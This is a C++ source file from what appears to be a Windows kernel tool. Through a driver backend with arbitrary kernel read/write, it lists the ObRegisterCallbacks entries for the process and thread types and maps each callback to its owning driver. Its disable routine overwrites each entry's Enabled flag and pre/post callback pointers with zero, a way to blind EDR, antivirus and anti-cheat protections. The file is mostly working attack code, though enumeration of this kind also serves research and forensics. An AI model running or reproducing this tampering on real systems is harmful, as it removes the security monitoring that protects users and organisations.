#include <Windows.h>
#include <cstdio>
#include <vector>
#include "kutil.h"
#include "driver/IDriverBackend.h"

// ─── ObRegisterCallbacks enumeration and control ──────────────────────────────
//
// _OBJECT_TYPE layout (Windows 10 x64, all modern builds including 22H2):
//   +0x0C8  CallbackList : LIST_ENTRY  (head of OB_CALLBACK_ENTRY linked list)
//
// OB_CALLBACK_ENTRY (per ObRegisterCallbacks operation registration):
//   +0x000  CallbackList  : LIST_ENTRY
//   +0x010  Operations    : DWORD  (1=CREATE, 2=DUPLICATE)
//   +0x014  Enabled       : BYTE
//   +0x018  Entry         : QWORD  (back-ptr to OB_CALLBACK registration handle)
//   +0x020  ObjectType    : QWORD
//   +0x028  PreOperation  : QWORD  (function pointer, our main target)
//   +0x030  PostOperation : QWORD  (function pointer)

#define OBJ_TYPE_CALLBACKLIST  0x0C8
#define OBE_OPERATIONS         0x010
#define OBE_ENABLED            0x014
#define OBE_PREOPERATION       0x028
#define OBE_POSTOPERATION      0x030

struct ObEntry {
    DWORD64     entryAddr;
    DWORD64     preOp;
    DWORD64     postOp;
    DWORD       operations;
    BYTE        enabled;
    const wchar_t* preOwner;
    DWORD64     preOwnerBase;
    DWORD64     preOwnerOff;
    const wchar_t* postOwner;
    DWORD64     postOwnerBase;
    DWORD64     postOwnerOff;
};

static std::vector<ObEntry> ScanType(const char* label, DWORD64 typeVarAddr) {
    std::vector<ObEntry> v;

    DWORD64 objType = g_drv->Rd64(typeVarAddr);
    if (!g_drv->IsKernelVA(objType)) {
        printf("  [!] %s: invalid OBJECT_TYPE pointer\n", label);
        return v;
    }

    DWORD64 listHead = objType + OBJ_TYPE_CALLBACKLIST;
    DWORD64 flink    = g_drv->Rd64(listHead);
    if (!g_drv->IsKernelVA(flink) || flink == listHead) return v;

    DWORD64 cur = flink;
    for (int guard = 0; cur != listHead && guard < 64; guard++) {
        ObEntry e{};
        e.entryAddr  = cur;
        e.operations = g_drv->Rd32(cur + OBE_OPERATIONS);
        e.enabled    = g_drv->Rd8 (cur + OBE_ENABLED);
        e.preOp      = g_drv->Rd64(cur + OBE_PREOPERATION);
        e.postOp     = g_drv->Rd64(cur + OBE_POSTOPERATION);
        KUtil::FindDriverByAddr(e.preOp,  &e.preOwner,  &e.preOwnerOff);
        KUtil::FindDriverByAddr(e.postOp, &e.postOwner, &e.postOwnerOff);
        v.push_back(e);
        cur = g_drv->Rd64(cur); // Flink
    }
    return v;
}

static void PrintEntry(int idx, const ObEntry& e, const char* typeLabel) {
    char ops[32]{};
    if (e.operations & 1) strcat_s(ops, "CREATE");
    if (e.operations & 2) { if (ops[0]) strcat_s(ops, "|"); strcat_s(ops, "DUPLICATE"); }

    printf("\n  [%d] %-8s  Entry:%p  Enabled:%u  Ops:%s\n",
        idx, typeLabel, (void*)e.entryAddr, e.enabled, ops);

    if (e.preOp)
        wprintf(L"       Pre : %p  %ls +0x%llx\n",
            (void*)e.preOp, e.preOwner, (unsigned long long)e.preOwnerOff);
    else
        printf( "       Pre : (none)\n");

    if (e.postOp)
        wprintf(L"       Post: %p  %ls +0x%llx\n",
            (void*)e.postOp, e.postOwner, (unsigned long long)e.postOwnerOff);
    else
        printf( "       Post: (none)\n");
}

void CmdObcb(bool doProcess, bool doThread) {
    SetConsoleOutputCP(CP_UTF8);
    KUtil::BuildDriverCache();

    DWORD64 PsProcessType = KUtil::KernelExport("PsProcessType");
    DWORD64 PsThreadType  = KUtil::KernelExport("PsThreadType");

    int total = 0;

    if (doProcess) {
        printf("\n=== Process ObCallbacks ===\n");
        auto v = ScanType("Process", PsProcessType);
        if (v.empty()) { printf("  (none)\n"); }
        else for (int i = 0; i < (int)v.size(); i++) PrintEntry(total + i, v[i], "Process");
        total += (int)v.size();
    }

    if (doThread) {
        printf("\n=== Thread ObCallbacks ===\n");
        auto v = ScanType("Thread", PsThreadType);
        if (v.empty()) { printf("  (none)\n"); }
        else for (int i = 0; i < (int)v.size(); i++) PrintEntry(total + i, v[i], "Thread");
        total += (int)v.size();
    }

    printf("\n  Total: %d callback entries\n\n", total);
}

static void SetEntryEnabled(DWORD64 targetPreOp, BYTE val) {
    KUtil::BuildDriverCache();
    DWORD64 typeVars[] = {
        KUtil::KernelExport("PsProcessType"),
        KUtil::KernelExport("PsThreadType")
    };

    bool found = false;
    for (auto tv : typeVars) {
        DWORD64 objType  = g_drv->Rd64(tv);
        if (!g_drv->IsKernelVA(objType)) continue;
        DWORD64 listHead = objType + OBJ_TYPE_CALLBACKLIST;
        DWORD64 cur      = g_drv->Rd64(listHead);
        for (int guard = 0; g_drv->IsKernelVA(cur) && cur != listHead && guard < 64; guard++) {
            DWORD64 pre = g_drv->Rd64(cur + OBE_PREOPERATION);
            if (pre == targetPreOp) {
                const wchar_t* owner; DWORD64 off;
                KUtil::FindDriverByAddr(pre, &owner, &off);
                wprintf(L"  [*] Found: %p  %ls +0x%llx\n", (void*)pre, owner, (unsigned long long)off);
                printf("  [*] Entry @ %p\n", (void*)cur);
                if (val == 0) {
                    g_drv->Wr8 (cur + OBE_ENABLED,      0);
                    g_drv->Wr64(cur + OBE_PREOPERATION,  0);
                    g_drv->Wr64(cur + OBE_POSTOPERATION, 0);
                    printf("  [+] Disabled (Enabled=0, PreOp=0, PostOp=0)\n");
                } else {
                    g_drv->Wr8(cur + OBE_ENABLED, 1);
                    printf("  [+] Enabled=1 set\n");
                }
                found = true;
            }
            cur = g_drv->Rd64(cur);
        }
    }
    if (!found)
        printf("  [!] No entry found with PreOperation == %p\n", (void*)targetPreOp);
}

void CmdDisable(unsigned long long addr) { SetConsoleOutputCP(CP_UTF8); SetEntryEnabled((DWORD64)addr, 0); }
void CmdEnable (unsigned long long addr) { SetConsoleOutputCP(CP_UTF8); SetEntryEnabled((DWORD64)addr, 1); }
